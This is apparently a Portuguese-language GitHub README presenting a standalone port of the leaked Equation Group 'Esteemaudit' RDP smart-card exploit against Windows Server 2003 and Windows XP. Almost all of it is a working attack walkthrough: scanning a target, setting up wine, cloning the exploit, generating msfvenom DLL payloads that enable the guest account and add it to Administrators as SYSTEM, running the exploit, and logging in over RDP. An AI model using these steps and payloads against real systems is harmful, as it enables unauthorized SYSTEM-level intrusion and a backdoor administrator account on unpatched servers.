# Esteemaudit without Metasploit

Explorando Remote Desktop do Windows Server 2003 com o exploit Esteemaudit (sem Metasploit) e obtendo RCE (Remote Code Execution).

Esta é uma portabilidade do Esteemaudit RDP Exploit vazado do Equationgroup (NSA). A vulnerabilidade explorada por este ataque está relacionada à autenticação de Smart Card, usada ao fazer logon no sistema por meio do serviço RDP. Os sistemas afetados são Windows Server 2003 SP1,SP2 e Windows XP SP0, SP1, SP3.

**Para realizar o teste foi utilizado o Kali Linux 2022.3 como máquina atacante e Windows Server 2003 (x86) como máquina alvo.**

Identifique as possíveis vulnerabilidades no Remote Desktop do Windows Server:
```
nmap -v --script vuln -p3389 -Pn 172.16.1.110
```
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
```

**Sabendo que é vulnerável, vamos preparar o Kali para realizar a exploração.**

No Kali, instale as dependências:
```
dpkg --add-architecture i386
apt-get update && apt-get install wine32
```

Realize a instalação dos pacotes libwine, wine, wine32 e winetricks
```
apt-get install libwine wine wine32 winetricks
```

Após a instalação certifique-se que o **Wine** esteja instalado, em seguida execute o comando **exit** para sair do **Wine**.
```
wine cmd
Microsoft Windows 6.1.7601 (4.0.2)

Z:\>exit
```

Baixe o exploit e copie os arquivos:
```
git clone https://github.com/caique-garbim/Esteemaudit-without-Metasploit
cd Esteemaudit-without-Metasploit/
cp esteemaudit/ /usr/share/
cd /usr/share/esteemaudit
```

No arquivo **Esteemaudit-2.1.0.xml**, na linha nº 5 é necessário informar o IP do Windows Server e a porta TCP do serviço RDP (3389 é o padrão):

![image](https://user-images.githubusercontent.com/76706456/186801171-388f3d39-a25c-412b-b868-d70aa20815ba.png)

**Vamos gerar os payloads com os comandos que desejamos executar no Windows Server:**

Neste exemplo, iremos habilitar o usuário convidado, gerando o seguinte payload:
```
msfvenom -a x86 --platform Windows -p windows/exec CMD="net user guest /active:yes" -f dll > /root/.wine/drive_c/shell.dll
```
*(Sabendo que o comando será executado como NT AUTHORITY\SYSTEM podemos realizar tarefas administrativas)*

Em seguida iremos envia-lo para o servidor:
```
wine Esteemaudit-2.1.0.exe
```

![image](https://user-images.githubusercontent.com/76706456/186801388-f88fcc11-938e-4cba-be60-2b56e2a821ff.png)

![image](https://user-images.githubusercontent.com/76706456/186801418-a2aea451-eb16-4fe8-a883-5a579e0ea2a7.png)

*(No final da execução retornou um erro, porém o comando foi executado com sucesso)*

Em seguida vamos adiciona-lo ao grupo de Administradores, gerando o seguinte payload:
```
msfvenom -a x86 --platform Windows -p windows/exec CMD='net localgroup "Administrators" guest /add' -f dll > /root/.wine/drive_c/shell.dll
```

Em seguida iremos envia-lo para o servidor:
```
wine Esteemaudit-2.1.0.exe
```

![image](https://user-images.githubusercontent.com/76706456/186801388-f88fcc11-938e-4cba-be60-2b56e2a821ff.png)

![image](https://user-images.githubusercontent.com/76706456/186801418-a2aea451-eb16-4fe8-a883-5a579e0ea2a7.png)

*(No final da execução retornou um erro, porém o comando foi executado com sucesso)*

Por fim, vamos nos conectar ao RDP utilizando o usuário guest:
```
rdesktop 172.16.1.110 -u guest -p ''
```

![image](https://user-images.githubusercontent.com/76706456/186801609-9c57de87-1d2c-42b5-9a74-c7e44c0d178f.png)